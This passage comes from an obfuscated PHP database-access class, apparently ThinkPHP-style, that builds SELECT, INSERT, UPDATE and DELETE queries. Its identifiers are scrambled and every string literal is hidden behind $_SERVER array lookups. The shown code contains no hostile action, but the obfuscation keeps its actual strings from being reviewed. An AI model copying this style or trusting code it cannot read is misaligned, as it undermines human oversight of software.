= floor(mt_rand(0, count($°Ã•ˆÔ[$ëÁÜó¾Ú[883]]) - 1)); $ÇÅŸÙ¯ = $şÅÑ¢; } $şÅÑ¢ = $ÇÅŸÙ¯ !== -1 ? $ÇÅŸÙ¯ : $şÅÑ¢; $ÙÀ€Ëêî = array($ëÁÜó¾Ú[885] => isset($°Ã•ˆÔ[$ëÁÜó¾Ú[885]][$şÅÑ¢]) ? $°Ã•ˆÔ[$ëÁÜó¾Ú[885]][$şÅÑ¢] : $°Ã•ˆÔ[$ëÁÜó¾Ú[885]][0], $ëÁÜó¾Ú[886] => isset($°Ã•ˆÔ[$ëÁÜó¾Ú[886]][$şÅÑ¢]) ? $°Ã•ˆÔ[$ëÁÜó¾Ú[886]][$şÅÑ¢] : $°Ã•ˆÔ[$ëÁÜó¾Ú[886]][0], $ëÁÜó¾Ú[883] => isset($°Ã•ˆÔ[$ëÁÜó¾Ú[883]][$şÅÑ¢]) ? $°Ã•ˆÔ[$ëÁÜó¾Ú[883]][$şÅÑ¢] : $°Ã•ˆÔ[$ëÁÜó¾Ú[883]][0], $ëÁÜó¾Ú[884] => isset($°Ã•ˆÔ[$ëÁÜó¾Ú[884]][$şÅÑ¢]) ? $°Ã•ˆÔ[$ëÁÜó¾Ú[884]][$şÅÑ¢] : $°Ã•ˆÔ[$ëÁÜó¾Ú[884]][0], $ëÁÜó¾Ú[31] => isset($°Ã•ˆÔ[$ëÁÜó¾Ú[31]][$şÅÑ¢]) ? $°Ã•ˆÔ[$ëÁÜó¾Ú[31]][$şÅÑ¢] : $°Ã•ˆÔ[$ëÁÜó¾Ú[31]][0], $ëÁÜó¾Ú[913] => isset($°Ã•ˆÔ[$ëÁÜó¾Ú[913]][$şÅÑ¢]) ? $°Ã•ˆÔ[$ëÁÜó¾Ú[913]][$şÅÑ¢] : $°Ã•ˆÔ[$ëÁÜó¾Ú[913]][0], $ëÁÜó¾Ú[27] => isset($°Ã•ˆÔ[$ëÁÜó¾Ú[27]][$şÅÑ¢]) ? $°Ã•ˆÔ[$ëÁÜó¾Ú[27]][$şÅÑ¢] : $°Ã•ˆÔ[$ëÁÜó¾Ú[27]][0]); return $this->connect($ÙÀ€Ëêî, $şÅÑ¢); } public function parseDSN($ê·Ôá›‚) { $äãÁóÀ” =& $_SERVER[Å¶¨Şêº]; if (empty($ê·Ôá›‚)) { return !1; } $æèÔ°Ö’ = parse_url($ê·Ôá›‚); if ($æèÔ°Ö’[$äãÁóÀ”[192]]) { $¯Ñ¦à™„ = array($äãÁóÀ”[958] => $æèÔ°Ö’[$äãÁóÀ”[192]], $äãÁóÀ”[885] => isset($æèÔ°Ö’[$äãÁóÀ”[599]]) ? $æèÔ°Ö’[$äãÁóÀ”[599]] : $äãÁóÀ”[12], $äãÁóÀ”[886] => isset($æèÔ°Ö’[$äãÁóÀ”[982]]) ? $æèÔ°Ö’[$äãÁóÀ”[982]] : $äãÁóÀ”[12], $äãÁóÀ”[883] => isset($æèÔ°Ö’[$äãÁóÀ”[193]]) ? $æèÔ°Ö’[$äãÁóÀ”[193]] : $äãÁóÀ”[12], $äãÁóÀ”[884] => isset($æèÔ°Ö’[$äãÁóÀ”[194]]) ? $æèÔ°Ö’[$äãÁóÀ”[194]] : $äãÁóÀ”[12], $äãÁóÀ”[31] => isset($æèÔ°Ö’[$äãÁóÀ”[95]]) ? substr($æèÔ°Ö’[$äãÁóÀ”[95]], 1) : $äãÁóÀ”[12]); } else { preg_match($äãÁóÀ”[983], trim($ê·Ôá›‚), $‘²‹šá); $¯Ñ¦à™„ = array($äãÁóÀ”[958] => $‘²‹šá[1], $äãÁóÀ”[885] => $‘²‹šá[2], $äãÁóÀ”[886] => $‘²‹šá[3], $äãÁóÀ”[883] => $‘²‹šá[4], $äãÁóÀ”[884] => $‘²‹šá[5], $äãÁóÀ”[31] => $‘²‹šá[6]); } $¯Ñ¦à™„[$äãÁóÀ”[913]] = $äãÁóÀ”[12]; return $¯Ñ¦à™„; } protected function debug() { $îõË¼Ä÷ =& $_SERVER[Å¶¨Şêº]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $îõË¼Ä÷[984]; if (think_config($îõË¼Ä÷[985])) { think_status($îõË¼Ä÷[986]); think_trace($this->queryStr . $îõË¼Ä÷[987] . think_status($îõË¼Ä÷[34], $îõË¼Ä÷[986], 6) . $îõË¼Ä÷[988], $îõË¼Ä÷[12], $îõË¼Ä÷[989]); } } protected function parseLock($ªƒòĞØÙ = false) { $¹ŸÆÄ¬â =& $_SERVER[Å¶¨Şêº]; if (!$ªƒòĞØÙ) { return $¹ŸÆÄ¬â[12]; } if ($¹ŸÆÄ¬â[915] == $this->dbType) { return $¹ŸÆÄ¬â[990]; } return $¹ŸÆÄ¬â[991]; } protected function parseSet($ºÀâ¨Çâ) { $ğæËÔÛ‹ =& $_SERVER[Å¶¨Şêº]; foreach ($ºÀâ¨Çâ as $óáÂê“ê => $ìèÃ‚) { if (is_array($ìèÃ‚) && $ğæËÔÛ‹[307] == $ìèÃ‚[0]) { $¾…Ü‡ôò[] = $this->parseKey($óáÂê“ê) . $ğæËÔÛ‹[881] . $ìèÃ‚[1]; } elseif (is_scalar($ìèÃ‚) || is_null($ìèÃ‚)) { $¾…Ü‡ôò[] = $this->parseKey($óáÂê“ê) . $ğæËÔÛ‹[881] . $this->parseValue($ìèÃ‚); } } return $ğæËÔÛ‹[992] . implode($ğæËÔÛ‹[60], $¾…Ü‡ôò); } protected function bindParam($ë¬¹¤ÈË, $ÏÛ“¯Şî) { $this->bind[$_SERVER[Å¶¨Şêº][4] . $ë¬¹¤ÈË] = $ÏÛ“¯Şî; } protected function parseBind($Óù²ƒ›) { $Óù²ƒ› = array_merge($this->bind, $Óù²ƒ›); $this->bind = array(); return $Óù²ƒ›; } function parseKey(&$áÔõÃä‰, $ÄÎœ©· = true) { if ($ÄÎœ©·) { $áÔõÃä‰ = $this->parseKeyCheck($áÔõÃä‰); } return $áÔõÃä‰; } function parseKeyCheck($Ç™ÒÂ—) { $ìˆùí× =& $_SERVER[Å¶¨Şêº]; $Ç™ÒÂ— = trim($Ç™ÒÂ—); if (!preg_match($ìˆùí×[993], $Ç™ÒÂ—)) { think_exception($ìˆùí×[994] . $Ç™ÒÂ—); } return $Ç™ÒÂ—; } protected function parseValue($Å‡®‚Ò) { $°ÎÕº§¨ =& $_SERVER[Å¶¨Şêº]; if (is_string($Å‡®‚Ò)) { $Å‡®‚Ò = $°ÎÕº§¨[954] . $this->escapeString($Å‡®‚Ò) . $°ÎÕº§¨[954]; } elseif (isset($Å‡®‚Ò[0]) && is_string($Å‡®‚Ò[0]) && strtolower($Å‡®‚Ò[0]) == $°ÎÕº§¨[307]) { $Å‡®‚Ò = $this->escapeString($Å‡®‚Ò[1]); } elseif (is_array($Å‡®‚Ò)) { $Å‡®‚Ò = array_map(array($this, $°ÎÕº§¨[955]), $Å‡®‚Ò); } elseif (is_bool($Å‡®‚Ò)) { $Å‡®‚Ò = $Å‡®‚Ò ? $°ÎÕº§¨[99] : $°ÎÕº§¨[209]; } elseif (is_null($Å‡®‚Ò)) { $Å‡®‚Ò = $°ÎÕº§¨[114]; } return $Å‡®‚Ò; } protected function parseField($ƒ™¸Êğı) { $ÃÊ€½ß =& $_SERVER[Å¶¨Şêº]; if (is_string($ƒ™¸Êğı) && strpos($ƒ™¸Êğı, $ÃÊ€½ß[60])) { $ƒ™¸Êğı = explode($ÃÊ€½ß[60], $ƒ™¸Êğı); } if (is_array($ƒ™¸Êğı)) { $³äÓÚ = array(); foreach ($ƒ™¸Êğı as $êåø†Ò  => $¤ıÍŒ) { if (!is_numeric($êåø†Ò )) { $³äÓÚ[] = $this->parseKey($êåø†Ò , !1) . $ÃÊ€½ß[995] . $this->parseKey($¤ıÍŒ); } else { $³äÓÚ[] = $this->parseKey($¤ıÍŒ); } } $öÑÌéãœ = implode($ÃÊ€½ß[60], $³äÓÚ); } elseif (is_string($ƒ™¸Êğı) && !empty($ƒ™¸Êğı)) { $öÑÌéãœ = $ƒ™¸Êğı; } else { $öÑÌéãœ = $ÃÊ€½ß[200]; } return $öÑÌéãœ; } protected function parseTable($ÏÁÅ¤Ã) { $¹® ˜ € =& $_SERVER[Å¶¨Şêº]; if (is_array($ÏÁÅ¤Ã)) { $’™à£ˆ½ = array(); foreach ($ÏÁÅ¤Ã as $÷Ÿ¯§–˜ => $È®‰»ÜÔ) { if (!is_numeric($÷Ÿ¯§–˜)) { $’™à£ˆ½[] = $this->parseKey($÷Ÿ¯§–˜) . $¹® ˜ €[63] . $this->parseKey($È®‰»ÜÔ); } else { $’™à£ˆ½[] = $this->parseKey($÷Ÿ¯§–˜); } } $ÏÁÅ¤Ã = $’™à£ˆ½; } elseif (is_string($ÏÁÅ¤Ã)) { if (strstr($ÏÁÅ¤Ã, $¹® ˜ €[63])) { return $ÏÁÅ¤Ã; } $ÏÁÅ¤Ã = explode($¹® ˜ €[60], $ÏÁÅ¤Ã); array_walk($ÏÁÅ¤Ã, array($this, $¹® ˜ €[903])); } return $¹® ˜ €[897] . trim(implode($¹® ˜ €[996], $ÏÁÅ¤Ã), $¹® ˜ €[394]) . $¹® ˜ €[897]; } protected function parseWhere($ÈÀöÑÉç) { $†¿¤ù¾ï =& $_SERVER[Å¶¨Şêº]; $üŒùû’¨ = $†¿¤ù¾ï[12]; if (is_string($ÈÀöÑÉç)) { $üŒùû’¨ = $ÈÀöÑÉç; } else { $–ßô…´ = isset($ÈÀöÑÉç[$†¿¤ù¾ï[997]]) ? strtoupper($ÈÀöÑÉç[$†¿¤ù¾ï[997]]) : $†¿¤ù¾ï[12]; if (in_array($–ßô…´, array($†¿¤ù¾ï[998], $†¿¤ù¾ï[999], $†¿¤ù¾ï[1000]))) { $–ßô…´ = $†¿¤ù¾ï[63] . $–ßô…´ . $†¿¤ù¾ï[63]; unset($ÈÀöÑÉç[$†¿¤ù¾ï[997]]); } else { $–ßô…´ = $†¿¤ù¾ï[1001]; } foreach ($ÈÀöÑÉç as $ÄÍÊÓï => $ÑûÙƒš) { $üŒùû’¨ .= $†¿¤ù¾ï[287]; if (is_numeric($ÄÍÊÓï)) { $ÄÍÊÓï = $†¿¤ù¾ï[1002]; } if (0 === strpos($ÄÍÊÓï, $†¿¤ù¾ï[11])) { $üŒùû’¨ .= $this->parseThinkWhere($ÄÍÊÓï, $ÑûÙƒš); } else { if (!preg_match($†¿¤ù¾ï[1003], trim($ÄÍÊÓï))) { think_exception(think_lang($†¿¤ù¾ï[1004]) . $†¿¤ù¾ï[4] . $ÄÍÊÓï); } $úŸåç¼ = is_array($ÑûÙƒš) && isset($ÑûÙƒš[$†¿¤ù¾ï[1005]]); $ÄÍÊÓï = trim($ÄÍÊÓï); if (strpos($ÄÍÊÓï, $†¿¤ù¾ï[293])) { $ºƒˆÕ½§ = explode($†¿¤ù¾ï[293], $ÄÍÊÓï); $ã²¢õ“¼ = array(); foreach ($ºƒˆÕ½§ as $µÂ³­ıê => $¹îå÷ó¢) { $İÍ™üê = $úŸåç¼ ? $ÑûÙƒš[$µÂ³­ıê] : $ÑûÙƒš; $ã²¢õ“¼[] = $†¿¤ù¾ï[270] . $this->parseWhereItem($this->parseKey($¹îå÷ó¢), $İÍ™üê) . $†¿¤ù¾ï[902]; } $üŒùû’¨ .= implode($†¿¤ù¾ï[1006], $ã²¢õ“¼); } elseif (strpos($ÄÍÊÓï, $†¿¤ù¾ï[294])) { $ºƒˆÕ½§ = explode($†¿¤ù¾ï[294], $ÄÍÊÓï); $ã²¢õ“¼ = array(); foreach ($ºƒˆÕ½§ as $µÂ³­ıê => $¹îå÷ó¢) { $İÍ™üê = $úŸåç¼ ? $ÑûÙƒš[$µÂ³­ıê] : $ÑûÙƒš; $ã²¢õ“¼[] = $†¿¤ù¾ï[270] . $this->parseWhereItem($this->parseKey($¹îå÷ó¢), $İÍ™üê) . $†¿¤ù¾ï[902]; } $üŒùû’¨ .= implode($†¿¤ù¾ï[1001], $ã²¢õ“¼); } else { $üŒùû’¨ .= $this->parseWhereItem($this->parseKey($ÄÍÊÓï), $ÑûÙƒš); } } $üŒùû’¨ .= $†¿¤ù¾ï[288] . $–ßô…´; } $üŒùû’¨ = substr($üŒùû’¨, 0, -strlen($–ßô…´)); } return empty($üŒùû’¨) ? $†¿¤ù¾ï[12] : $†¿¤ù¾ï[1007] . $üŒùû’¨; } protected function parseWhereItem($×ïÀÕ˜ä, $á…ÂşÑî) { $ÈÚËÙº =& $_SERVER[Å¶¨Şêº]; $’ñğ¦åå = $ÈÚËÙº[12]; if (is_array($á…ÂşÑî)) { if (is_string($á…ÂşÑî[0])) { $â™¸ç§• = strtolower($á…ÂşÑî[0]); if (in_array($á…ÂşÑî[0], array($ÈÚËÙº[881], $ÈÚËÙº[1008], $ÈÚËÙº[1009], $ÈÚËÙº[1010], $ÈÚËÙº[1011], $ÈÚËÙº[1012]))) { $’ñğ¦åå .= $×ïÀÕ˜ä . $ÈÚËÙº[63] . $á…ÂşÑî[0] . $ÈÚËÙº[63] . $this->parseValue($á…ÂşÑî[1]); } elseif (preg_match($ÈÚËÙº[1013], $á…ÂşÑî[0])) { $’ñğ¦åå .= $×ïÀÕ˜ä . $ÈÚËÙº[63] . $this->exp[$â™¸ç§•] . $ÈÚËÙº[63] . $this->parseValue($á…ÂşÑî[1]); } elseif (preg_match($ÈÚËÙº[1014], $á…ÂşÑî[0])) { if (is_array($á…ÂşÑî[1])) { $ÉµÌ±œô = isset($á…ÂşÑî[2]) ? strtoupper($á…ÂşÑî[2]) : $ÈÚËÙº[999]; if (in_array($ÉµÌ±œô, array($ÈÚËÙº[998], $ÈÚËÙº[999], $ÈÚËÙº[1000]))) { $åöËß„  = array(); foreach ($á…ÂşÑî[1] as $ÕÕŸÒ¿¬) { $åöËß„ [] = $×ïÀÕ˜ä . $ÈÚËÙº[63] . $this->exp[$â™¸ç§•] . $ÈÚËÙº[63] . $this->parseValue($ÕÕŸÒ¿¬); } $’ñğ¦åå .= $ÈÚËÙº[270] . implode($ÈÚËÙº[63] . $ÉµÌ±œô . $ÈÚËÙº[63], $åöËß„ ) . $ÈÚËÙº[902]; } } else { $’ñğ¦åå .= $×ïÀÕ˜ä . $ÈÚËÙº[63] . $this->exp[$â™¸ç§•] . $ÈÚËÙº[63] . $this->parseValue($á…ÂşÑî[1]); } } elseif ($ÈÚËÙº[307] == $â™¸ç§•) { $’ñğ¦åå .= $ÈÚËÙº[900] . $×ïÀÕ˜ä . $ÈÚËÙº[63] . $á…ÂşÑî[1] . $ÈÚËÙº[1015]; } elseif (preg_match($ÈÚËÙº[1016], $á…ÂşÑî[0])) { $’ñğ¦åå .= $á…ÂşÑî[0]; } elseif (preg_match($ÈÚËÙº[1017], $á…ÂşÑî[0])) { if (isset($á…ÂşÑî[2]) && $ÈÚËÙº[307] == $á…ÂşÑî[2]) { $’ñğ¦åå .= $×ïÀÕ˜ä . $ÈÚËÙº[63] . $this->exp[$â™¸ç§•] . $ÈÚËÙº[63] . $á…ÂşÑî[1]; } else { if (is_string($á…ÂşÑî[1])) { $á…ÂşÑî[1] = explode($ÈÚËÙº[60], $á…ÂşÑî[1]); } $¿ë¨ƒ×› = implode($ÈÚËÙº[60], $this->parseValue($á…ÂşÑî[1])); $’ñğ¦åå .= $×ïÀÕ˜ä . $ÈÚËÙº[63] . $this->exp[$â™¸ç§•] . $ÈÚËÙº[900] . $¿ë¨ƒ×› . $ÈÚËÙº[902]; } } elseif (preg_match($ÈÚËÙº[1018], $á…ÂşÑî[0])) { $Ş¼í­ó = is_string($á…ÂşÑî[1]) ? explode($ÈÚËÙº[60], $á…ÂşÑî[1]) : $á…ÂşÑî[1]; $’ñğ¦åå .= $ÈÚËÙº[900] . $×ïÀÕ˜ä . $ÈÚËÙº[63] . $this->exp[$â™¸ç§•] . $ÈÚËÙº[63] . $this->parseValue($Ş¼í­ó[0]) . $ÈÚËÙº[1001] . $this->parseValue($Ş¼í­ó[1]) . $ÈÚËÙº[288]; } else { think_exception(think_lang($ÈÚËÙº[1004]) . $ÈÚËÙº[4] . $á…ÂşÑî[0]); } } else { $á†ÎŞ½à = count($á…ÂşÑî); $æŒ–”´ = $ÈÚËÙº[12]; if (is_string($á…ÂşÑî[$á†ÎŞ½à - 1])) { $æŒ–”´ = isset($á…ÂşÑî[$á†ÎŞ½à - 1]) ? strtoupper($á…ÂşÑî[$á†ÎŞ½à - 1]) : $ÈÚËÙº[12]; if (in_array($æŒ–”´, array($ÈÚËÙº[998], $ÈÚËÙº[999], $ÈÚËÙº[1000]))) { $á†ÎŞ½à = $á†ÎŞ½à - 1; } } else { $æŒ–”´ = $ÈÚËÙº[998]; } for ($ğèØœÛ‚ = 0; $ğèØœÛ‚ < $á†ÎŞ½à; $ğèØœÛ‚++) { $Ş¼í­ó = is_array($á…ÂşÑî[$ğèØœÛ‚]) ? $á…ÂşÑî[$ğèØœÛ‚][1] : $á…ÂşÑî[$ğèØœÛ‚]; if ($ÈÚËÙº[307] == strtolower($á…ÂşÑî[$ğèØœÛ‚][0])) { $’ñğ¦åå .= $ÈÚËÙº[270] . $×ïÀÕ˜ä . $ÈÚËÙº[63] . $Ş¼í­ó . $ÈÚËÙº[1015] . $æŒ–”´ . $ÈÚËÙº[63]; } else { $®éŸâë = is_array($á…ÂşÑî[$ğèØœÛ‚]) ? $this->exp[strtolower($á…ÂşÑî[$ğèØœÛ‚][0])] : $ÈÚËÙº[881]; if (!$®éŸâë && is_array($á…ÂşÑî[$ğèØœÛ‚]) && in_array($á…ÂşÑî[$ğèØœÛ‚][0], array($ÈÚËÙº[881], $ÈÚËÙº[1008], $ÈÚËÙº[1009], $ÈÚËÙº[1010], $ÈÚËÙº[1011], $ÈÚËÙº[1012]))) { $®éŸâë = $á…ÂşÑî[$ğèØœÛ‚][0]; } $’ñğ¦åå .= $ÈÚËÙº[270] . $×ïÀÕ˜ä . $ÈÚËÙº[63] . $®éŸâë . $ÈÚËÙº[63] . $this->parseValue($Ş¼í­ó) . $ÈÚËÙº[1015] . $æŒ–”´ . $ÈÚËÙº[63]; } } $’ñğ¦åå = substr($’ñğ¦åå, 0, -4); } } else { $’ñğ¦åå .= $×ïÀÕ˜ä . $ÈÚËÙº[1019] . $this->parseValue($á…ÂşÑî); } return $’ñğ¦åå; } protected function parseThinkWhere($ø³–¥³›, $®ª²ã«ˆ) { $Ô¸Æİóˆ =& $_SERVER[Å¶¨Şêº]; $üëê³ğ = $Ô¸Æİóˆ[12]; switch ($ø³–¥³›) { case $Ô¸Æİóˆ[362]: $üëê³ğ = $®ª²ã«ˆ; break; case $Ô¸Æİóˆ[1002]: $üëê³ğ = is_string($®ª²ã«ˆ) ? $®ª²ã«ˆ : substr($this->parseWhere($®ª²ã«ˆ), 6); break; case $Ô¸Æİóˆ[1020]: parse_str($®ª²ã«ˆ, $Ûá˜íŸ©); if (isset($Ûá˜íŸ©[$Ô¸Æİóˆ[997]])) { $Ú­Í³×¢ = $Ô¸Æİóˆ[63] . strtoupper($Ûá˜íŸ©[$Ô¸Æİóˆ[997]]) . $Ô¸Æİóˆ[63]; unset($Ûá˜íŸ©[$Ô¸Æİóˆ[997]]); } else { $Ú­Í³×¢ = $Ô¸Æİóˆ[1001]; } $ ¶×¹Î = array(); foreach ($Ûá˜íŸ© as $ÆëãõÇ¿ => $Ãéç¦É§) { $ ¶×¹Î[] = $this->parseKey($ÆëãõÇ¿) . $Ô¸Æİóˆ[1019] . $this->parseValue($Ãéç¦É§); } $üëê³ğ = implode($Ú­Í³×¢, $ ¶×¹Î); break; } return $üëê³ğ; } protected function parseLimit($ßÚ±¼ç) { $êªªÌí” =& $_SERVER[Å¶¨Şêº]; return !empty($ßÚ±¼ç) ? $êªªÌí”[61] . $ßÚ±¼ç . $êªªÌí”[63] : $êªªÌí”[12]; } protected function parseJoin($‘¨½ÍƒÁ) { $ª€ÉĞïå =& $_SERVER[Å¶¨Şêº]; $Š¾Èäú¡ = $ª€ÉĞïå[12]; if (!empty($‘¨½ÍƒÁ)) { if (is_array($‘¨½ÍƒÁ)) { foreach ($‘¨½ÍƒÁ as $á¸É´ => $µòÒã¿) { if (!1 !== stripos($µòÒã¿, $ª€ÉĞïå[1021])) { $Š¾Èäú¡ .= $ª€ÉĞïå[63] . $µòÒã¿; } else { $Š¾Èäú¡ .= $ª€ÉĞïå[1022] . $µòÒã¿; } } } else { $Š¾Èäú¡ .= $ª€ÉĞïå[1022] . $‘¨½ÍƒÁ; } } $Š¾Èäú¡ = preg_replace($ª€ÉĞïå[1023], think_config($ª€ÉĞïå[927]) . $ª€ÉĞïå[1024], $Š¾Èäú¡); return $Š¾Èäú¡; } protected function parseOrder($—İäÌàÌ) { $ÄÏúö„ğ =& $_SERVER[Å¶¨Şêº]; if (is_array($—İäÌàÌ)) { $Ò¤üôˆ = array(); foreach ($—İäÌàÌ as $¿¦‡Õ´ë => $ñ€™àö½) { if (is_numeric($¿¦‡Õ´ë)) { $Ò¤üôˆ[] = $this->parseKey($ñ€™àö½); } else { $ñ€™àö½ = in_array(strtoupper(trim($ñ€™àö½)), array($ÄÏúö„ğ[1025], $ÄÏúö„ğ[1026])) ? $ÄÏúö„ğ[63] . $ñ€™àö½ : $ÄÏúö„ğ[12]; if (preg_match($ÄÏúö„ğ[1027], $¿¦‡Õ´ë)) { $Ò¤üôˆ[] = $this->parseKey($¿¦‡Õ´ë) . $ñ€™àö½; } else { think_exception($ÄÏúö„ğ[1028] . $¿¦‡Õ´ë); } } } $—İäÌàÌ = implode($ÄÏúö„ğ[60], $Ò¤üôˆ); } return !empty($—İäÌàÌ) ? $ÄÏúö„ğ[1029] . $—İäÌàÌ : $ÄÏúö„ğ[12]; } protected function parseGroup($œë¤Î‚ç) { $ì”‘¹ =& $_SERVER[Å¶¨Şêº]; return !empty($œë¤Î‚ç) ? $ì”‘¹[1030] . $œë¤Î‚ç : $ì”‘¹[12]; } protected function parseHaving($¢‘¬ÙÎ) { $¬Û±´ó‰ =& $_SERVER[Å¶¨Şêº]; return !empty($¢‘¬ÙÎ) ? $¬Û±´ó‰[1031] . $¢‘¬ÙÎ : $¬Û±´ó‰[12]; } protected function parseComment($…“‹œ) { $ãË©„‚¤ =& $_SERVER[Å¶¨Şêº]; return !empty($…“‹œ) ? $ãË©„‚¤[1032] . $…“‹œ . $ãË©„‚¤[1033] : $ãË©„‚¤[12]; } protected function parseDistinct($ñ£”à—¼) { $ŠíĞü‹ =& $_SERVER[Å¶¨Şêº]; return !empty($ñ£”à—¼) ? $ŠíĞü‹[1034] : $ŠíĞü‹[12]; } protected function parseUnion($¬»¹ÁƒÕ) { $‡ôÔòøû =& $_SERVER[Å¶¨Şêº]; if (empty($¬»¹ÁƒÕ)) { return $‡ôÔòøû[12]; } if (isset($¬»¹ÁƒÕ[$‡ôÔòøû[358]])) { $Âü–ç†· = $‡ôÔòøû[1035]; unset($¬»¹ÁƒÕ[$‡ôÔòøû[358]]); } else { $Âü–ç†· = $‡ôÔòøû[1036]; } foreach ($¬»¹ÁƒÕ as $ø§Ìİ–·) { $ïİµòã[] = $Âü–ç†· . (is_array($ø§Ìİ–·) ? $this->buildSelectSql($ø§Ìİ–·) : $ø§Ìİ–·); } return implode($‡ôÔòøû[63], $ïİµòã); } public function insert($É”İè„Ù, $ÌÒÉ ‚£ = array(), $Áš¹ğÑÉ = false) { $©Ç§ÔÊÀ =& $_SERVER[Å¶¨Şêº]; $ò²Îì…ñ = $ö¿‹Ìæ¥ = array(); $this->model = $ÌÒÉ ‚£[$©Ç§ÔÊÀ[291]]; foreach ($É”İè„Ù as $¶‡Ğ²åÔ => $È‹óÅÜ) { if (is_array($È‹óÅÜ) && $©Ç§ÔÊÀ[307] == $È‹óÅÜ[0]) { $ö¿‹Ìæ¥[] = $this->parseKey($¶‡Ğ²åÔ); $ò²Îì…ñ[] = $È‹óÅÜ[1]; } elseif (is_scalar($È‹óÅÜ) || is_null($È‹óÅÜ)) { $ö¿‹Ìæ¥[] = $this->parseKey($¶‡Ğ²åÔ); $ò²Îì…ñ[] = $this->parseValue($È‹óÅÜ); } } $±…Ê†…¾ = ($Áš¹ğÑÉ ? $©Ç§ÔÊÀ[904] : $©Ç§ÔÊÀ[905]) . $©Ç§ÔÊÀ[906] . $this->parseTable($ÌÒÉ ‚£[$©Ç§ÔÊÀ[289]]) . $©Ç§ÔÊÀ[900] . implode($©Ç§ÔÊÀ[60], $ö¿‹Ìæ¥) . $©Ç§ÔÊÀ[901] . implode($©Ç§ÔÊÀ[60], $ò²Îì…ñ) . $©Ç§ÔÊÀ[902]; $±…Ê†…¾ .= $this->parseLock(isset($ÌÒÉ ‚£[$©Ç§ÔÊÀ[841]]) ? $ÌÒÉ ‚£[$©Ç§ÔÊÀ[841]] : !1); $±…Ê†…¾ .= $this->parseComment(!empty($ÌÒÉ ‚£[$©Ç§ÔÊÀ[364]]) ? $ÌÒÉ ‚£[$©Ç§ÔÊÀ[364]] : $©Ç§ÔÊÀ[12]); return $this->execute($±…Ê†…¾, $this->parseBind(!empty($ÌÒÉ ‚£[$©Ç§ÔÊÀ[295]]) ? $ÌÒÉ ‚£[$©Ç§ÔÊÀ[295]] : array())); } public function selectInsert($‡¯»ÔÓí, $ö´´â’’, $ÁîÁÔÃÍ = array()) { $’’¢øÔÍ =& $_SERVER[Å¶¨Şêº]; $this->model = $ÁîÁÔÃÍ[$’’¢øÔÍ[291]]; if (is_string($‡¯»ÔÓí)) { $‡¯»ÔÓí = explode($’’¢øÔÍ[60], $‡¯»ÔÓí); } array_walk($‡¯»ÔÓí, array($this, $’’¢øÔÍ[903])); $¹í·œß  = $’’¢øÔÍ[1037] . $this->parseTable($ö´´â’’) . $’’¢øÔÍ[900] . implode($’’¢øÔÍ[60], $‡¯»ÔÓí) . $’’¢øÔÍ[1015]; $¹í·œß  .= $this->buildSelectSql($ÁîÁÔÃÍ); return $this->execute($¹í·œß , $this->parseBind(!empty($ÁîÁÔÃÍ[$’’¢øÔÍ[295]]) ? $ÁîÁÔÃÍ[$’’¢øÔÍ[295]] : array())); } public function update($œåóñ¢Ÿ, $­²»ª£) { $›ôîß’ =& $_SERVER[Å¶¨Şêº]; $this->model = $­²»ª£[$›ôîß’[291]]; $Ÿ„ø©Ü¯ = $›ôîß’[1038] . $this->parseTable($­²»ª£[$›ôîß’[289]]) . $this->parseSet($œåóñ¢Ÿ) . $this->parseWhere(!empty($­²»ª£[$›ôîß’[285]]) ? $­²»ª£[$›ôîß’[285]] : $›ôîß’[12]) . $this->parseOrder(!empty($­²»ª£[$›ôîß’[375]]) ? $­²»ª£[$›ôîß’[375]] : $›ôîß’[12]) . $this->parseLimit(!empty($­²»ª£[$›ôîß’[302]]) ? $­²»ª£[$›ôîß’[302]] : $›ôîß’[12]) . $this->parseLock(isset($­²»ª£[$›ôîß’[841]]) ? $­²»ª£[$›ôîß’[841]] : !1) . $this->parseComment(!empty($­²»ª£[$›ôîß’[364]]) ? $­²»ª£[$›ôîß’[364]] : $›ôîß’[12]); return $this->execute($Ÿ„ø©Ü¯, $this->parseBind(!empty($­²»ª£[$›ôîß’[295]]) ? $­²»ª£[$›ôîß’[295]] : array())); } public function delete($¾ÉÄ˜Ò— = array()) { $èüëşË =& $_SERVER[Å¶¨Şêº]; $this->model = $¾ÉÄ˜Ò—[$èüëşË[291]]; $í­‚…ã¥ = $èüëşË[1039] . $this->parseTable($¾ÉÄ˜Ò—[$èüëşË[289]]) . $this->parseWhere(!empty($¾ÉÄ˜Ò—[$èüëşË[285]]) ? $¾ÉÄ˜Ò—[$èüëşË[285]] : $èüëşË[12]) . $this->parseOrder(!empty($¾ÉÄ˜Ò—[$èüëşË[375]]) ? $¾ÉÄ˜Ò—[$èüëşË[375]] : $èüëşË[12]) . $this->parseLimit(!empty($¾ÉÄ˜Ò—[$èüëşË[302]]) ? $¾ÉÄ˜Ò—[$èüëşË[302]] : $èüëşË[12]) . $this->parseLock(isset($¾ÉÄ˜Ò—[$èüëşË[841]]) ? $¾ÉÄ˜Ò—[$èüëşË[841]] : !1) . $this->parseComment(!empty($¾ÉÄ˜Ò—[$èüëşË[364]]) ? $¾ÉÄ˜Ò—[$èüëşË[364]] : $èüëşË[12]); return $this->execute($í­‚…ã¥, $this->parseBind(!empty($¾ÉÄ˜Ò—[$èüëşË[295]]) ? $¾ÉÄ˜Ò—[$èüëşË[295]] : array())); } public function select($ÀÒê‹ÀÀ = array()) { $šµÈñ• =& $_SERVER[Å¶¨Şêº]; $this->model = $ÀÒê‹ÀÀ[$šµÈñ•[291]]; $°ÕÙ«Ş = $this->buildSelectSql($ÀÒê‹ÀÀ); $ï—ˆşÇë = isset($ÀÒê‹ÀÀ[$šµÈñ•[359]]) ? $ÀÒê‹ÀÀ[$šµÈñ•[359]] : !1; if ($ï—ˆşÇë) { $·®àºú = is_string($ï—ˆşÇë[$šµÈñ•[105]]) ? $ï—ˆşÇë[$šµÈñ•[105]] : $šµÈñ•[1040] . md5($°ÕÙ«Ş); $¨§Ö¬Ù… = think_cache($·®àºú, $šµÈñ•[12], $ï—ˆşÇë); if (!1 !== $¨§Ö¬Ù…) { return $¨§Ö¬Ù…; } } $óŸª¤òĞ = $this->query($°ÕÙ«Ş, $this->parseBind(!empty($ÀÒê‹ÀÀ[$šµÈñ•[295]]) ? $ÀÒê‹ÀÀ[$šµÈñ•[295]] : array())); if ($ï—ˆşÇë && !1 !== $óŸª¤òĞ) { think_cache($·®àºú, $óŸª¤òĞ, $ï—ˆşÇë); } return $óŸª¤òĞ; } public function buildSelectSql($àÕ­àâø = array()) { $ı¹ÂãĞÍ =& $_SERVER[Å¶¨Şêº]; if 